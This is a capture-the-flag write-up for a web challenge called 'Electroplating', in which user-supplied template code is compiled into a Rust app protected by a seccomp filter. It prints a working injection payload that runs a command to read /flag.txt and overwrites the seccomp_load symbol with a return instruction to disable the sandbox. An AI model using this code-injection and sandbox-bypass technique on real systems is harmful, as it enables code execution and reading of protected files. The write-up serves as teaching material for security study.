## Electroplating

Category: Web

Author: Tony



The app provides a simple 'HTML templating' function implemented in Rust. Anything between `<templ>` tags is compiled into a Rust function, which is called when the template tag is encountered. The compiled site is then hosted internally in the Docker container, and the contents is requested and displayed by the public-facing website to the user.

The download contains a precompiled version of the `seccomp_sys` Rust library, along with all other dependencies. The Rust source is written from a template in a Python file, and then compiled on-the-fly. After opening a web server, the Rust app applies a seccomp filter, allowing only the syscalls:

```rust
static ALLOWED: &'static [usize] = &[0, 1, 3, 11, 44,
                                     60, 89, 131, 202,
                                     231, 318];
// read, write, close, munmap, sendto, exit, readlink, sigaltstack, futex, exit_group, getrandom
```

Some experimentation reveals that these are the bare minimum syscalls that allows the app to function; none of which will allow RCE or file write.

### Solution

To solve the challenge, we simply have to prevent the seccomp filter being applied in the first place. We are unable to execute code before the seccomp function is called but we can modify compile-time attributes of the app.

```rust
<templ>
use std::process::Command;
let output = Command::new("cat").arg("/flag.txt").output().unwrap().stdout;
use std::str;
    let s = match str::from_utf8(&output) {
        Ok(v) => v,
        Err(e) => panic!("Invalid UTF-8 sequence: {}", e),
    };
    s.to_string()

}

#[no_mangle]
#[link_section=".text"]
pub static seccomp_load: [u8; 1] = [195];

fn nothing() {
    ()
</templ>
</html>
```

```rust
#[no_mangle]
#[link_section=".text"]
pub static seccomp_load: [u8; 1] = [195];
```

is the important part - this simply overwrites the `seccomp_load` function (eventually called by `apply_seccomp`) with a `ret`. The first function in our `<templ>` will be run, printing the flag out. We can then read the flag, `rarctf{D0n7_l3t-y0ur-5k1ll5-g0-rus7y!-24c55263}`.

### Unintended method
The challenge could also be solved using the `include_str!` macro to include the flag file directly into the binary.
